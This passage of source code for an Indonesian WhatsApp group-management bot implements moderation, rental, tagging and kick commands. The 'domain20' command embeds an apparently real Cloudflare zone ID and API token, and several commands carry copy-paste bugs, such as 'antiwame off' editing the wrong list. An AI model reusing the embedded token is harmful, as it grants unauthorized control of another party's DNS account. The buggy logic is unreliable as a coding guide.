  break
              case 'antilinkall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (AntiLinkTwitter) return replyviex('Already activated')
ntilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replyviex('Success in turning on all antilink in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nIf you're not an admin, don't send any link in this group or u will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiLinkAll) return replyviex('Already deactivated')
let off = ntilinkall.indexOf(from)
ntilinkall.splice(off, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(ntilinkall))
replyviex('Success in turning off all antilink in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antitoxic': case 'antibadword': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (antiToxic) return replyviex('Already activated')
nttoxic.push(from)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replyviex('Success in turning on antitoxic in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to use bad words in this group, one who uses will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!antiToxic) return replyviex('Already deactivated')
let off = nttoxic.indexOf(from)
nttoxic.splice(off, 1)
fs.writeFileSync('./database/antitoxic.json', JSON.stringify(nttoxic))
replyviex('Success in turning off antitoxic in this group')
} else {
  let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'antiwame': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkch) return replyviex('Already activated')
ntwame.push(from)
fs.writeFileSync('./database/antiwame.json', JSON.stringify(ntwame))
replyviex('Success in turning on antiwame in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antiwame) return replyviex('Already deactivated')
let off = ntlinkch.indexOf(from)
ntwame.splice(off, 1)
fs.writeFileSync('./database/antilinkch.json', JSON.stringify(ntlinkch))
replyviex('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'addsewa': {
    try {
        if (!TradID) {
            return replyviex("Fitur ini hanya untuk Pangeran Warr!");
        }
        if (!text || text.split(' ').length < 2) {
            return replyviex(
                `Gunakan dengan cara ${prefix + command} *linkgc waktu*\n\n` +
                `Contoh: ${command} https://chat.whatsapp.com/JanPql7MaMLa 30d\n\n` +
                `*CATATAN:*\n` +
                `d = hari (day)\n` +
                `m = menit (minute)\n` +
                `s = detik (second)\n` +
                `y = tahun (year)\n` +
                `h = jam (hour)`
            );
        }
        const [link, waktu] = text.split(' ');
        if (!isUrl(link) || !link.includes('https://chat.whatsapp.com/')) {
            return replyviex("Link grup WhatsApp tidak valid!");
        }
        if (!waktu) {
            return replyviex("Harap tentukan durasi waktu untuk sewa!");
        }
        const groupId = link.split('https://chat.whatsapp.com/')[1];
        const groupData = await TradzSigma.groupAcceptInvite(groupId);
        if (checkSewaGroup(groupData, sewa)) {
            return replyviex("Bot sudah disewa oleh grup tersebut!");
        }
        addSewaGroup(groupData, waktu, sewa);
        replyviex("Berhasil menambahkan sewa grup dengan waktu tertentu!");
    } catch (error) {
        console.error("Error in 'addsewa' command:", error);
        replyviex("Terjadi kesalahan saat memproses permintaan. Silakan coba lagi.");
    }
}
break
case'delsewa':{
            if (!TradID) return replyviex("Fitur khusus owner!")
            if (!m.isGroup) return replyviex(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
            if (!isSewa) return replyviex(`Bot tidak disewa di Grup ini`)
            sewa.splice(getSewaPosition(m.chat, sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
            reply(`Sukses del sewa di grup ini`)
			}
break
case 'listsewa':{
            let list_sewa_list = `*✨✨LIST SEWA✨✨*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `*Expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            TradzSigma.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
break
case 'ceksewa':{
            let list_sewa_list = `*CEK SEWA*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = x.expired - Date.now()
                    list_sewa_list += `*Expired :* ${msToDate(ceksewa)}\n\n`
                }
            }
            TradzSigma.sendMessage(m.chat, { text: list_sewa_list }, { quoted: m })
        }
break
case 'antilinkch': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (args[0] === "on") {
if (Antilinkch) return replyviex('Already activated')
ntlinkch.push(from)
fs.writeFileSync('./database/antilinkch.json', JSON.stringify(ntlinkch))
replyviex('Success in turning on antiwame in this group')
var groupe = await TradzSigma.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
TradzSigma.sendMessage(from, {text: `\`\`\`「 ⚠️Warning⚠️ 」\`\`\`\n\nNobody is allowed to send group link in this group, one who sends will be kicked immediately!`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!Antilinkch) return replyviex('Already deactivated')
let off = ntlinkch.indexOf(from)
ntlinkch.splice(off, 1)
fs.writeFileSync('./database/antilinkch.json', JSON.stringify(ntlinkch))
replyviex('Success in turning off antiwame in this group')
} else {
let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.create({
        body: proto.Message.InteractiveMessage.Body.create({
          text: `Hai ${pushname}\nSilakan klik tombol di bawah untuk menggunakan _*${command}*_ command`
        }),
        footer: proto.Message.InteractiveMessage.Footer.create({
          text: namabot
        }),
        header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './library/data/image/thumb.jpg' } }, { upload: TradzSigma.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: `{
                "title":"PILIH ON/OFF ♨️",
                "sections":[{
                  "title":"PILIH ON/OFF ",
                  "rows":[{
                    "header":"HIDUPKAN ✅",
                    "title":"MEMILIH ",
                    "description":"MENGHIDUPKAN ✅",
                    "id":"${prefix + command} on"
                  },
                  {
                    "header":"MEMATIKAN ❌",
                    "title":"MEMILIH ",
                    "description":"MEMATIKAN ❌",
                    "id":"${prefix + command} off"
                  }]
                }]
              }`
            }
          ]
        }),
        contextInfo: {
          mentionedJid: [m.sender],
          forwardingScore: 999,
          isForwarded: true,
          forwardedNewsletterMessageInfo: {
            newsletterJid: '120363401647250932@newsletter',
            newsletterName: ownername,
            serverMessageId: 143
          }
        }
      })
    }
  }
}, { quoted: m });

await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
});
  }
  }
  break
case 'domain20': {
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "cTJzNrTtWoTkj9d-LueQAnBtgVA4-3MZMUc9bTgE";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return replyviex("PENGGUNAAN .domain4 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return replyviex("host tidak valid, pastikan host hanya mengandung huruf, angka, - (strip), dan . (titik)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return replyviex(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) replyviex(`*_Berhasil Menambah Subdomain✅_*\n_Ip : ${e['ip']}_\n_Hostname: ${e['name']}_\n\n*_Subdomain By celiaofficial⚡_*`);
             else replyviex(`gagal membuat subdomain\nMsg: ${e['error']}`)
           }); }
           break
  
   case 'leavegc': {
if (!TradID) return reply(mess.only.owner)
await TradzSigma.groupLeave(m.chat)
await replyviex(`sukses kak`)
            }
            break
case 'add': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TradzSigma.groupParticipantsUpdate(m.chat, [users], 'add')
await replyviex(`sukses kak`)
}
break
case 'closetime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyviex('*Choose:*\nsecond\nminute\nhour\n\n*Contoh*\n10 second')
}
replyviex(`Close Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const close = `*On time* Group Closed By Admin\nNow Only Admins Can Send Messages`
TradzSigma.groupSettingUpdate(from, 'announcement')
replyviex(close)
}, timer)
}
break
           case 'ephemeral': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyviex('Enter the value enable/disable')
if (args[0] === 'enable') {
await TradzSigma.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
} else if (args[0] === 'disable') {
await TradzSigma.sendMessage(m.chat, { disappearingMessagesInChat: false })
await replyviex(`sukses kak`)
}
            }
            break

            case 'delete': case 'del': {
if (!TradID) return reply(mess.only.owner)
if (!m.quoted) throw false
let { chat, id } = m.quoted
 TradzSigma.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case '>l': {
if (!m.quoted) throw false
let { chat, id } = m.quoted
 TradzSigma.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'linkgroup': case 'linkgc': case 'gclink': case 'grouplink': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let response = await TradzSigma.groupInviteCode(m.chat)
TradzSigma.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup Link : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
case 'd': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) return replyviex('The message was not sent by a bot!')
                 TradzSigma.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
case 'opentime': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (args[1] == 'second') {
var timer = args[0] * `1000`
} else if (args[1] == 'minute') {
var timer = args[0] * `60000`
} else if (args[1] == 'hour') {
var timer = args[0] * `3600000`
} else if (args[1] == 'day') {
var timer = args[0] * `86400000`
} else {
return replyviex('*Choose:*\nsecond\nminute\nhour\n\n*Contoh*\n10 second')
}
replyviex(`Open Time ${q} Starting from now`)
setTimeout(() => {
var nomor = m.participant
const open = `*On time* Group Opened By Admin\n Now Members Can Send Messages`
TradzSigma.groupSettingUpdate(from, 'not_announcement')
replyviex(open)
}, timer)
}
break
case 'sider':
  case 'siders': {
    const more = String.fromCharCode(8206)
const readMore = more.repeat(4001)
function msToDate(ms) {
  let d = isNaN(ms) ? '--' : Math.floor(ms / 86400000)
  let h = isNaN(ms) ? '--' : Math.floor(ms / 3600000) % 24
  let m = isNaN(ms) ? '--' : Math.floor(ms / 60000) % 60
  let s = isNaN(ms) ? '--' : Math.floor(ms / 1000) % 60
  if (d == 0 && h == 0 && m == 0) {
        return "Baru Saja"
    } else {
        return [d, 'H ', h, 'J '].map(v => v.toString().padStart(2, 0)).join('')
    }
  
}
const metadata = await TradzSigma.groupMetadata(m.chat);
const groupName = metadata.subject;
    var lama = 86400000 * 7
    const now = new Date().toLocaleString("en-US", {
        timeZone: "Asia/Jakarta"
    });
    const milliseconds = new Date(now).getTime();

    let member = groupMetadata.participants.map(v => v.id)
    if (!text) {
        var pesan = "Harap aktif di grup karena akan ada pembersihan anggota setiap saat.*"
    } else {
        var pesan = text
    }
    var sum
    sum = member.length
    var total = 0
    var sider = []
    for (let i = 0; i < sum; i++) {
        let users = m.isGroup ? groupMetadata.participants.find(u => u.id == member[i]) : {}
        if ((typeof global.db.users[member[i]] == 'undefined' || milliseconds * 1 - global.db.users[member[i]].lastseen > lama) && !users.isAdmin && !users.isSuperAdmin) {
            if (typeof global.db.users[member[i]] !== 'undefined') {
                if (global.db.users[member[i]].banned == true) {
                    total++
                    sider.push(member[i])
                }
            } else {
                total++
                sider.push(member[i])
            }
        }
    }
    if (total == 0) return reply(`*Tidak ada member sider pada grup ini.*`)
   TradzSigma.sendMessage(m.chat, { text: `*${total}/${sum}* Anggota Grup *${groupName}* Menjadi Anggota Sider karena Alasan:\n1. Tidak Aktif Selama Lebih Dari 7 Hari\n2. Bergabung Namun Tidak Pernah Nimbrun\n_“${pesan}”_\n\n*Anggota Sider yang Terdaftar:*\n${sider.map(v => '  • @' + v.replace(/@.+/, '' + typeof global.db.users[v] == "undefined" ? ' Sider ' : ' Off ' + msToDate(milliseconds * 1 - global.db.users[v].lastseen))).join('\n')}`}, m, {
        contextInfo: {
            mentionedJid: sider
        }
    })
}
break
case '🐚':
case 'kick': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TradzSigma.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyviex(`sukses kak`)
}
break
//=========================================\\
case 'kickall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
const users = participants.map(a => a.id)
await TradzSigma.groupParticipantsUpdate(m.chat, [users], 'remove')
await replyviex(`sukses kak`)
}
break
case 'setbotname':{
if (!TradID) return reply(mess.only.owner)
if (!text) return replyviex(`Dimana namanya?\nContoh: ${prefix + command} DinzID BotID`)
    await TradzSigma.updateProfileName(text)
    replyviex(`Success in changing the name of bot's number`)
    }
    break
case 'setbotbio':{
if (!TradID) return reply(mess.only.owner)
if (!text) return replyviex(`Dimana teksnya?\nContoh: ${prefix + command} DinzID BotID`)
    await TradzSigma.updateProfileStatus(text)
    replyviex(`Success in changing the bio of bot's number`)
    }
    break
   case 'setnamegc': case 'setgroupname': case 'setsubject': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyviex('Text ?')
await TradzSigma.groupUpdateSubject(m.chat, text)
await replyviex(`sukses kak`)
            }
            break
          case 'setdesc': case 'setdesk': {
if (!m.isGroup) return reply(mess.only.group)
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!isAdmins) return reply('Khusus Admin!!')
if (!text) return replyviex('Text ?')
await TradzSigma.groupUpdateDescription(m.chat, text)
await replyviex(`sukses kak`)
            }
            break
//=========================================\\
case 'getpp':{
if (!m.isGroup) return reply ("Digunakan Khsus Dalam Group")
let userss = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let ghosst = userss
	try {
   var ppuser = await TradzSigma.profilePictureUrl(ghosst, 'image')
} catch (err) {
   var ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
TradzSigma.sendMessage(from, { image: { url: ppuser }}, { quoted: m })
}
break 
//=========================================\\
case 'setppgroup': case 'setgcpp': case 'setgrouppp': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
if (!quoted) return replyviex(`Where is the picture?`)
if (!/image/.test(mime)) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyviex(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`)
var mediz = await TradzSigma.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await TradzSigma.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
replyviex(`Success`)
} else {
var memeg = await TradzSigma.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
replyviex(`Success`)
}
}
break
case 'deleteppgroup': case 'delppgc': case 'deleteppgc': case 'delppgroup': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
    await TradzSigma.removeProfilePicture(from)
    }
    break
case 'deleteppbot': case 'delppbot': {
if (!TradID) return reply(mess.only.owner)
    await TradzSigma.removeProfilePicture(TradzSigma.user.id)
    replyviex(`Success in deleting bot's profile picture`)
    }
    break
case 'promote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TradzSigma.groupParticipantsUpdate(m.chat, [users], 'promote')
await replyviex(`sukses kak`)
}
break
case 'demote': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await TradzSigma.groupParticipantsUpdate(m.chat, [users], 'demote')
await replyviex(`sukses kak`)
}
break
//case 'hidetag': case 'ht': {
//if (!m.isGroup) return reply(mess.only.group)
//if (!isAdmins && !TradID) return reply('Khusus Admin!!')
//if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
//TradzSigma.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
//}
//break
case 'hidetag': case 'everyone': case 'ht': { 
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
let mem = m.isGroup ? await groupMetadata.participants.map(a => a.id) : ""
TradzSigma.sendMessage(m.chat, {
text: `@${m.chat}\n${text}`,
contextInfo: {
mentionedJid: mem, 
groupMentions: [
   {
groupSubject: `everyone`,
groupJid: m.chat,
    },
   ],
  },
});
}
break
case 'ht2': {
if (!m.isGroup) return reply(mess.only.group)
if (!TradID) return reply(mess.only.owner)
TradzSigma.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: m })
}
break
case 'totag': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
               if (!m.quoted) return replyviex(`Reply message with caption ${prefix + command}`)
               TradzSigma.sendMessage(m.chat, { forward: m.quoted.fakeObj, mentions: participants.map(a => a.id) })
               }
               break

case 'tagall': {
if (!m.isGroup) return reply(mess.only.group)
if (!isAdmins && !TradID) return reply('Khusus Admin!!')
if (!isBotAdmins) return reply('_Bot Harus Menjadi Admin Terlebih Dahulu_')
me = m.sender
let teks = `╚»˙·٠${themeemoji}●♥ Tag All ♥●${themeemoji}٠·˙«╝ 
 
 😶 *penanda :*  @${me.split('@')[0]}
 🌿 *Isi pesan : ${q ? q : 'tidak ada pesan'}*\n\n`
for (let mem of participants) {
teks += `${themeemoji} @${mem.id.split('@')[0]}\n`
}
TradzSigma.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
case 'ebinary': {
if (!q) return replyviex(`Send/reply text with captions ${prefix + command}`)
replyviex(mess.wait)
let { eBinary } = require('./library/scrape/binary')
let eb = await eBinary(`${q}`)
replyviex(eb)
}
break
case 'dbinary': {
if (!q) return replyviex(`Send/reply text with captions ${prefix + command}`)
replyviex(mess.wait)
let { dBinary } = require('./library/scrape/binary')
let db = await dBinary(`${q}`)
replyviex(db)
}
break
case 'toanime': case 'jadianime': {
TradzSigma.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
const Websocket = require("ws");
const crypto = require("node:crypto");
const path = require("path");
const mime = require("mime-types");
const WS_URL = "wss://pixnova.ai/demo-photo2anime/queue/join";
const IMAGE_URL = "https://oss-global.pixnova.ai/";
const SESSION = crypto.randomBytes(5).toString("hex").slice(0, 9);
let wss;
let promise;

function _connect(log) {
  return new Promise((resolve, reject) => {
    wss = new Websocket(WS_URL);
    wss.on("open", () => {
      console.log("[ INFO ] Koneksi ke websocket tersambung.");
      resolve();
    })

    wss.on("error", (error) => {
      console.error("[ ERROR ] " + error);
      reject(error);
    })

    wss.on("message", (chunk) => {
      const data = JSON.parse(chunk.toString());
      if (promise && promise.once) {
        promise.call(data)
        promise = null;
      } else if (promise && !promise.once) {
